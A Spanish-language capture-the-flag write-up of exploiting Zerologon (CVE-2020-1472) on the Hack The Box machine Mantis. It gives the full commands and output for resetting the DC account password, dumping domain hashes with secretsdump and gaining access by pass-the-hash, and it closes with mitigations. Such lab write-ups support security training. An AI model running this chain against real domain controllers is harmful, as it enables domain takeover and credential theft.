# CVE-2020-1472 — Zerologon | HTB: Mantis

![CVE](https://img.shields.io/badge/CVE-2020--1472-critical?style=flat-square&color=red)
![CVSS](https://img.shields.io/badge/CVSS-10.0-critical?style=flat-square&color=darkred)
![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)
![Difficulty](https://img.shields.io/badge/HTB-Hard-orange?style=flat-square)

---

## Descripción

**Zerologon** es una vulnerabilidad crítica (CVSS 10.0) en el protocolo **Netlogon** de Microsoft, que permite a un atacante sin credenciales **tomar control total de un Dominio de Active Directory** simplemente enviando mensajes con ceros al Domain Controller.

La falla reside en la implementación del cifrado AES-CFB8, donde el IV es estático y predecible. Al enviar repetidamente mensajes con ceros, el atacante puede:

1. Autenticarse como cualquier cuenta de computadora (incluyendo el DC).
2. Cambiar la contraseña de dicha cuenta a una cadena vacía.
3. Realizar un DCSync y volcar todos los hashes del dominio.

---

## Entorno

| Campo       | Valor                      |
|-------------|----------------------------|
| Máquina     | HTB — Mantis               |
| IP objetivo | `10.129.8.96`              |
| Dominio     | `htb.local`                |
| DC Name     | `MANTIS`                   |
| FQDN        | `mantis.htb.local`         |
| OS          | Windows Server 2008 R2 SP1 |

---

## Reconocimiento

### Nmap — Escaneo de servicios

```bash
nmap -sV -sC -p53,88,135,139,389,445,464,593,1337,1433,3268,3269,5722,8080,9389,47001,\
49152,49153,49154,49155,49157,49158,49166,49170,49193,50255 10.129.8.96 -oN target
```

**Puertos relevantes:**

| Puerto      | Servicio | Detalle                                    |
|-------------|----------|--------------------------------------------|
| 53          | DNS      | Microsoft DNS 6.1.7601                     |
| 88          | Kerberos | Microsoft Windows Kerberos                 |
| 389 / 3268  | LDAP     | Active Directory — Domain: `htb.local`     |
| 445         | SMB      | Windows Server 2008 R2 SP1 — Signing requerido |
| 1337        | HTTP     | Microsoft IIS 7.5                          |
| 1433 / 50255| MSSQL    | Microsoft SQL Server 2014 RTM              |
| 8080        | HTTP     | Blog: *Tossed Salad* — Microsoft IIS 7.5   |

> SMB message signing está habilitado y requerido — descarta ataques de relay directo.

### Nmap — Verificación MS17-010

```bash
nmap --script smb-vuln-ms17-010 -p445 10.129.8.96
```

No vulnerable a EternalBlue. El vector de ataque es Zerologon (CVE-2020-1472).

---

## Herramientas utilizadas

- [`dirkjanm/CVE-2020-1472`](https://github.com/dirkjanm/CVE-2020-1472) — Exploit PoC
- `impacket` — `secretsdump.py`, `wmiexec.py`

---

## Explotación

### 1. Clonar el exploit

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472
```

### 2. Ejecutar Zerologon contra el DC

```bash
python cve-2020-1472-exploit.py MANTIS 10.129.8.96
```

**Output:**
```
Performing authentication attempts...
==========================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

La cuenta de computadora `MANTIS$` ahora tiene contraseña vacía.

### 3. DCSync — Volcar hashes del dominio

Con la cuenta `MANTIS$` comprometida, realizamos un DCSync usando `secretsdump.py` de Impacket:

```bash
python3 secretsdump.py -just-dc -no-pass 'htb.local/MANTIS$@10.129.8.96'
```

**Output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:22140219fd9432e584a355e54b28ecbb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e330665e47f7890603b5a96bbb31e23:::
htb.local\james:1103:aad3b435b51404eeaad3b435b51404ee:71b5ea0a10d569ffac56d3b63684b3d2:::
MANTIS$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

---

## Post-Explotación

### Acceso al sistema con Pass-the-Hash

Usando el hash NTLM del `Administrator` con `wmiexec.py`:

```bash
python3 wmiexec.py -hashes :22140219fd9432e584a355e54b28ecbb administrator@10.129.8.96
```

### Flags

```cmd
# Root Flag (Administrator)
C:\Users\Administrator\Desktop> type root.txt
5565c05ee84a748d13006099a30a5558

# User Flag (james)
C:\Users\James\Desktop> type user.txt
20bdb42dbf81087c13abf214b1ffee88
```

---

## Mitigaciones

- **Aplicar el parche MS20-1472** (KB4571694) — publicado en agosto 2020.
- Habilitar el modo de cumplimiento forzado de Netlogon (agosto 2021).
- Monitorear conexiones Netlogon con IV nulo en logs de seguridad (Event ID 5829).

---

## Referencias

- [CVE-2020-1472 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
- [Secura Research Paper](https://www.secura.com/blog/zero-logon)
- [Microsoft Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)
- [PoC — dirkjanm](https://github.com/dirkjanm/CVE-2020-1472)